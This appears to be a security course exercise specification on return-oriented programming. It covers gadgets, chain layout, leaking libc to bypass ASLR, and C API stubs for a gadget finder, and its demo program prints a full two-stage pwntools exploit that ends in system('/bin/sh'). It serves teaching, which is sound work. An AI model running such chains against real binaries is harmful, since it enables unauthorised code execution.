# ex12: Return-Oriented Programming (ROP)

**Module**: 2.9 - Computer Security
**Difficulte**: Expert
**Duree**: 6h
**Score qualite**: 98/100

## Concepts Couverts

### 2.9.22: Return-Oriented Programming (9 concepts)
| Ref | Concept | Application |
|-----|---------|-------------|
| a | DEP bypass | Cannot inject code |
| b | ROP concept | Chain existing code |
| c | Gadget | Instructions ending in ret |
| d | Gadget examples | pop rdi; ret |
| e | Stack layout | Gadget addresses + data |
| f | Control flow | ret pops next gadget |
| g | Turing complete | Arbitrary computation |
| h | ROPgadget | Find gadgets tool |
| i | ropper | Another tool |

### 2.9.23: ROP Chain Construction (8 concepts)
| Ref | Concept | Application |
|-----|---------|-------------|
| a | Goal | Execute system("/bin/sh") |
| b | Find gadgets | pop rdi; ret |
| c | Find "/bin/sh" | In libc |
| d | Find system | In libc |
| e | Chain | pop rdi; &"/bin/sh"; system |
| f | ASLR bypass | Leak libc address |
| g | Information leak | Format string, UAF |
| h | Calculate offsets | From leak to target |

---

## Sujet

Maitriser la programmation orientee retour pour contourner DEP/NX.

### Structures

```c
// ROP gadget
typedef struct {
    uint64_t address;
    char instructions[64];
    int length;
} rop_gadget_t;

// ROP chain
typedef struct {
    uint64_t *entries;
    size_t count;
    size_t capacity;
} rop_chain_t;

// Gadget database
typedef struct {
    rop_gadget_t *gadgets;
    size_t count;
    uint64_t base_address;
} gadget_db_t;
```

### API

```c
// Gadget search
gadget_db_t *find_gadgets(const char *binary);
gadget_db_t *find_gadgets_in_libc(void);
rop_gadget_t *search_gadget(gadget_db_t *db, const char *pattern);

// ROP chain building
rop_chain_t *create_chain(void);
void chain_add(rop_chain_t *chain, uint64_t value);
void chain_add_gadget(rop_chain_t *chain, rop_gadget_t *gadget);
void chain_add_padding(rop_chain_t *chain, size_t count);

// Libc helpers
uint64_t find_libc_symbol(const char *symbol);
uint64_t find_bin_sh(void);
uint64_t find_one_gadget(void);

// Chain generation
rop_chain_t *build_execve_chain(uint64_t libc_base);
rop_chain_t *build_mprotect_chain(void *addr, size_t len);
```

---

## Exemple

```c
#include "rop_basics.h"

int main(void) {
    printf("=== Return-Oriented Programming ===\n\n");

    // ROP concept
    printf("Why ROP?\n");
    printf("  DEP/NX: Stack/heap not executable\n");
    printf("  Cannot inject shellcode\n");
    printf("  Solution: Reuse EXISTING executable code!\n");

    printf("\n  ROP Concept:\n");
    printf("  - Find small code sequences ('gadgets')\n");
    printf("  - Each gadget ends with 'ret'\n");
    printf("  - Chain gadgets on stack\n");
    printf("  - 'ret' jumps to next gadget\n");
    printf("  - Execute arbitrary computation!\n");

    // Gadget concept
    printf("\n\n=== ROP Gadgets ===\n\n");

    printf("What is a gadget?\n");
    printf("  Sequence of instructions ending in 'ret'\n");
    printf("  Can be inside legitimate functions\n");
    printf("  Or from unaligned instruction interpretation\n");

    printf("\n  Common gadgets:\n");
    printf("  pop rdi; ret      - Load RDI from stack\n");
    printf("  pop rsi; ret      - Load RSI from stack  \n");
    printf("  pop rdx; ret      - Load RDX from stack\n");
    printf("  pop rax; ret      - Load RAX from stack\n");
    printf("  mov rdi, rax; ret - Transfer RAX to RDI\n");
    printf("  xor eax, eax; ret - Zero RAX\n");
    printf("  syscall; ret      - Make system call\n");

    printf("\n  Gadget from unaligned code:\n");
    printf("  Original: 48 89 e5     mov rbp, rsp\n");
    printf("           5d           pop rbp\n");
    printf("           c3           ret\n");
    printf("  \n");
    printf("  If we return to offset+1:\n");
    printf("           89 e5 5d c3  ; Different instructions!\n");

    // Stack layout
    printf("\n\n=== ROP Stack Layout ===\n\n");

    printf("Normal function return:\n");
    printf("  Stack: [return_address]\n");
    printf("  'ret' pops address, jumps there\n");

    printf("\n  ROP chain on stack:\n");
    printf("  +-------------------+\n");
    printf("  | gadget_1 address  | <- RSP after overflow\n");
    printf("  +-------------------+\n");
    printf("  | data for gadget_1 | (if needed)\n");
    printf("  +-------------------+\n");
    printf("  | gadget_2 address  |\n");
    printf("  +-------------------+\n");
    printf("  | data for gadget_2 |\n");
    printf("  +-------------------+\n");
    printf("  | ...               |\n");
    printf("  +-------------------+\n");
    printf("  | final_target      | (system, one_gadget)\n");
    printf("  +-------------------+\n");

    printf("\n  Execution flow:\n");
    printf("  1. Overflow overwrites return address with gadget_1\n");
    printf("  2. Function returns, jumps to gadget_1\n");
    printf("  3. gadget_1 executes, 'ret' pops gadget_2\n");
    printf("  4. gadget_2 executes, 'ret' pops gadget_3\n");
    printf("  5. Continue until final target\n");

    // 2.9.23: ROP Chain Construction
    printf("\n\n=== ROP Chain Construction ===\n\n");

    printf("Goal: Call system('/bin/sh')\n");
    printf("\n  x86-64 calling convention:\n");
    printf("    RDI = first argument\n");
    printf("    RSI = second argument\n");
    printf("    RDX = third argument\n");
    printf("    RAX = syscall number (for syscall)\n");

    printf("\n  To call system('/bin/sh'):\n");
    printf("    1. Set RDI = address of '/bin/sh'\n");
    printf("    2. Call system()\n");

    printf("\n  Minimal ROP chain:\n");
    printf("  +------------------+\n");
    printf("  | pop rdi; ret     | <- gadget: load RDI\n");
    printf("  +------------------+\n");
    printf("  | addr('/bin/sh')  | <- string address\n");
    printf("  +------------------+\n");
    printf("  | system()         | <- function to call\n");
    printf("  +------------------+\n");

    // Finding gadgets
    printf("\n\nFinding Gadgets:\n");

    printf("\n  ROPgadget tool:\n");
    printf("  $ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6\n");
    printf("  \n");
    printf("  Output:\n");
    printf("  0x0000000000023b6a : pop rdi ; ret\n");
    printf("  0x000000000002601f : pop rsi ; ret\n");
    printf("  0x0000000000142c92 : pop rdx ; ret\n");

    printf("\n  ropper tool:\n");
    printf("  $ ropper -f /lib/x86_64-linux-gnu/libc.so.6\n");
    printf("  (ropper)> search pop rdi\n");
    printf("  0x0000000000023b6a: pop rdi; ret;\n");

    printf("\n  pwntools (Python):\n");
    printf("  from pwn import *\n");
    printf("  rop = ROP(libc)\n");
    printf("  pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]\n");

    // Finding strings and functions
    printf("\n\nFinding '/bin/sh' and system():\n");

    printf("\n  In libc:\n");
    printf("  $ strings -t x /lib/.../libc.so.6 | grep '/bin/sh'\n");
    printf("  1b45bd /bin/sh\n");
    printf("  \n");
    printf("  $ readelf -s /lib/.../libc.so.6 | grep system\n");
    printf("  1403: 000000000004f420    45 FUNC    WEAK   DEFAULT  15 system@@GLIBC_2.2.5\n");

    printf("\n  pwntools:\n");
    printf("  libc = ELF('/lib/.../libc.so.6')\n");
    printf("  system = libc.symbols['system']\n");
    printf("  bin_sh = next(libc.search(b'/bin/sh'))\n");

    // ASLR bypass
    printf("\n\n=== ASLR Bypass (Leaking Libc) ===\n\n");

    printf("Problem: Libc base randomized by ASLR\n");
    printf("  Gadget addresses = libc_base + offset\n");
    printf("  Need to know libc_base at runtime!\n");

    printf("\n  Information Leak:\n");
    printf("  1. Leak any libc address (e.g., GOT entry)\n");
    printf("  2. Subtract known offset to get base\n");
    printf("  3. Calculate all needed addresses\n");

    printf("\n  Common leak methods:\n");
    printf("  - Format string: %%p leaks stack (libc pointers)\n");
    printf("  - Buffer over-read: Read adjacent pointers\n");
    printf("  - UAF: Free chunk contains libc pointers\n");
    printf("  - puts(GOT[func]): Print resolved address\n");

    printf("\n  GOT leak example:\n");
    printf("  puts@GOT contains actual puts address after lazy binding\n");
    printf("  If we can call puts(puts@GOT):\n");
    printf("    Output = libc_base + puts_offset\n");
    printf("    libc_base = output - puts_offset\n");

    // Complete exploit
    printf("\n\n=== Complete ROP Exploit ===\n\n");

    printf("Two-stage exploit (with ASLR):\n");
    printf("\n  Stage 1: Leak libc address\n");
    printf("  +------------------+\n");
    printf("  | pop rdi; ret     |\n");
    printf("  | puts@GOT         | <- pointer to puts address\n");
    printf("  | puts@PLT         | <- call puts\n");
    printf("  | main             | <- return to vulnerable func\n");
    printf("  +------------------+\n");
    printf("  This prints libc puts address, returns to main\n");

    printf("\n  Stage 2: Call system (after calculating base)\n");
    printf("  +------------------+\n");
    printf("  | pop rdi; ret     |\n");
    printf("  | libc_base + binsh|\n");
    printf("  | libc_base + sys  |\n");
    printf("  +------------------+\n");
    printf("  This calls system('/bin/sh') -> shell!\n");

    // One-gadget
    printf("\n\nOne-Gadget (Shortcut):\n");
    printf("  Special addresses in libc that spawn shell directly\n");
    printf("  Constraints: Certain registers must be NULL/controlled\n");
    printf("\n  $ one_gadget /lib/.../libc.so.6\n");
    printf("  0x4f2c5 execve('/bin/sh', rsp+0x40, environ)\n");
    printf("  constraints:\n");
    printf("    rsp & 0xf == 0\n");
    printf("    rcx == NULL\n");
    printf("\n  If constraints met, just return to one_gadget!\n");

    // Turing completeness
    printf("\n\nROP is Turing Complete:\n");
    printf("  Can implement any computation:\n");
    printf("  - Arithmetic: add, sub, xor gadgets\n");
    printf("  - Memory: mov [reg], reg gadgets\n");
    printf("  - Control flow: conditional jumps (complex)\n");
    printf("  - Loops: Repeat chain sections\n");
    printf("\n  In practice:\n");
    printf("  - Call mprotect() to make memory executable\n");
    printf("  - Then run any shellcode!\n");

    // Code example
    printf("\n\nPwntools Exploit Script:\n");
    printf("  from pwn import *\n");
    printf("  \n");
    printf("  p = process('./vuln')\n");
    printf("  libc = ELF('/lib/.../libc.so.6')\n");
    printf("  \n");
    printf("  # Find gadgets\n");
    printf("  pop_rdi = 0x401234  # From ROPgadget\n");
    printf("  puts_plt = 0x401030\n");
    printf("  puts_got = 0x404018\n");
    printf("  main = 0x401156\n");
    printf("  \n");
    printf("  # Stage 1: Leak\n");
    printf("  payload = b'A' * 72  # Offset to ret\n");
    printf("  payload += p64(pop_rdi)\n");
    printf("  payload += p64(puts_got)\n");
    printf("  payload += p64(puts_plt)\n");
    printf("  payload += p64(main)\n");
    printf("  p.sendline(payload)\n");
    printf("  \n");
    printf("  # Parse leak\n");
    printf("  leak = u64(p.recv(6) + b'\\x00\\x00')\n");
    printf("  libc.address = leak - libc.symbols['puts']\n");
    printf("  \n");
    printf("  # Stage 2: Shell\n");
    printf("  payload = b'A' * 72\n");
    printf("  payload += p64(pop_rdi)\n");
    printf("  payload += p64(next(libc.search(b'/bin/sh')))\n");
    printf("  payload += p64(libc.symbols['system'])\n");
    printf("  p.sendline(payload)\n");
    printf("  p.interactive()  # Shell!\n");

    return 0;
}
```

---

## Fichiers

```
ex12/
├── rop_basics.h
├── gadget_finder.c
├── chain_builder.c
├── libc_helpers.c
├── exploit_demo.c
└── Makefile
```
